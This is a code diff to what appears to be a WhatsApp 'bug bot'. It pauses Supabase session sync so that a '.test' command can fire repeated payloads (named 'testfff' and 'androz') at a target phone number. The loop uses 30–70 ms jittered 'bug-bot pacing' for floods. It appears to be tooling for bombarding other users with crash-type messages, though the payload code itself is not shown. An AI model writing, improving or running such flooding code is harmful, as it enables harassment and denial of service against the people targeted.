@@ -27,6 +27,7 @@ import {
     isSupabaseEnabled,
     downloadSessionFromSupabase,
     debouncedSyncLocalToSupabase,
+    setSyncPaused,
     deleteSessionFromSupabase,
     getAllSessionPhoneNumbers,
     saveUserToSupabase,
@@ -7032,13 +7033,24 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
             const fire = payloadKind === 'testfff' ? testfff : androz;
 
+            // Pause Supabase session sync for the burst — every send ratchets
+            // crypto keys and would otherwise re-trigger full-folder uploads
+            // (thousands of files) between sends. Resumed in finally(), which
+            // re-syncs everything once, so nothing is lost.
+            const syncPausedHere = isSupabaseEnabled();
+            if (syncPausedHere) setSyncPaused(true);
+
             let sent = 0;
-            for (let n = 0; n < count; n++) {
-                await fire(sock, targetJid, fffImage);
-                sent++;
-                log('TEST', `${phoneNumber}: .test [${payloadKind}${fffMode}] send ${sent}/${count} → ${targetJid} input="${input}"`);
-                // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
-                if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
+            try {
+                for (let n = 0; n < count; n++) {
+                    await fire(sock, targetJid, fffImage);
+                    sent++;
+                    log('TEST', `${phoneNumber}: .test [${payloadKind}${fffMode}] send ${sent}/${count} → ${targetJid} input="${input}"`);
+                    // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
+                    if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
+                }
+            } finally {
+                if (syncPausedHere) setSyncPaused(false);
             }
 
             await safeWaReply(sock, remoteJid, `🧪 [${payloadKind}${fffMode}] payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
